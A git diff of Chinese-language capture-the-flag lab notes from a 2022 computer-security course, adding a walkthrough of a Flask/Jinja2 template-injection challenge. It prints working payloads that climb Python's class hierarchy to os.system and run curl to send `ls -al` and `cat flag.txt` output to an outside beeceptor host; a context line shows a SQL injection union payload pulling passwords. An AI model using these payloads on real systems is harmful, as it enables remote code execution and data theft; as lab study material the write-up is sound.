@@ -35,7 +35,19 @@
 * 那我們現在目標是知道 password，因此下 `admin' union SELECT NULL, NULL, NULL, password FROM users -- #` 來從 users 這張表取得 password，可以拿到 flag `FLAG{Un10N_s31eCt/**/F14g_fR0m_s3cr3t}`。
 
 ## Normal Login Panel (Flag 2) - Lab
-* 
+* 登入進去之後可以看到 srouce code，是一份 python template 並且會吃 `greet` 這個參數，並且 `return render_template_string(f"Hello {greet}")`，因此我們可以針對 `greet` 這個參數做 template injection。
+    > ![web-lab04-source-code](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/web-lab04-source-code.png)
+* 先把資料送到 Burp 的 repeater 做資料從送，這邊 encode 可以改成 body encoding 會更好整理重送資料，可以看到不管是把 `greet` 設為 `a` or `{{7*7}}` 會正確回應 `Hello a` or `Hello 49`。
+* 因此依照目標是先找到任意一個東西的 class -> `__class__`，因此我們可以利用 `{{[].__class__}}` 來找到 `list` 這個 class，而 `{{[].__class__.__base__}}` 則是 `list` 的 base class，也就是 `object`，有就是回應到所有的 class 的 base 其實都是 object 這邊。
+    > ![web-lab04-list-class-base](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/web-lab04-list-class-base.png)
+* 因此目標是找到可以操作的 system command，因此我們可以利用 `{{[].__class__.__base__.__subclasses__()}}` 來找到所有的 class，因為我們希望操作 `os` 底下的 class，所以找到 `os._wrap_close` 來作為目標，找到之後可以利用 `{{[].__class__.__base__.__subclasses__()[140]}}` 來操作 `os._wrap_close` 這個 class (因為我們再 sublime 中看到他是地 141 個，也就是 list 中 index 的 140 個)。
+    > ![web-lab04-list-class-subclasses](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/web-lab04-list-class-subclasses.png)
+    > ![web-lab04-list-class-subclasses-os](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/web-lab04-list-class-subclasses-os.png)
+* 從 `__init__` 的 `__global__` 中可以看到 `os.system` (payload: `{{[].__class__.__base__.__subclasses__()[140].__init__.__globals__}}`)，因此我們可以利用 `{{[].__class__.__base__.__subclasses__()[140].__init__.__globals__['system']}}` 來確認 system 能不能用。
+    > ![web-lab04-list-class-subclasses-os-ls](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/web-lab04-list-class-subclasses-system.png)
+* 但因為 python 的 system 不會像 php 一樣回顯，因此用 [beeceptor](https://beeceptor.com/) 來準備一個簡單的 dns 並且用 `curl <dns>` 來送資料出來，顯示 ls 的結果 payload 如下 `{{[].__class__.__base__.__subclasses__()[140].__init__.__globals__['system']('curl https://crazyfirelee.free.beeceptor.com -d "`ls -al`"')}}`，印出 flag 的 payload 如下 `{{[].__class__.__base__.__subclasses__()[140].__init__.__globals__['system']('curl https://crazyfirelee.free.beeceptor.com -d "`cat flag.txt`"')}}`: `FLAG{S1_fu_Q1_m0_b4N_zHU_ru}`。
+    > ![web-lab04-list-class-subclasses-system-curl](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/web-lab04-list-class-subclasses-system-curl.png)
+    > ![web-lab04-list-class-subclasses-system-curl-flag](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/web-lab04-list-class-subclasses-system-curl-flag.png)
 
 
 
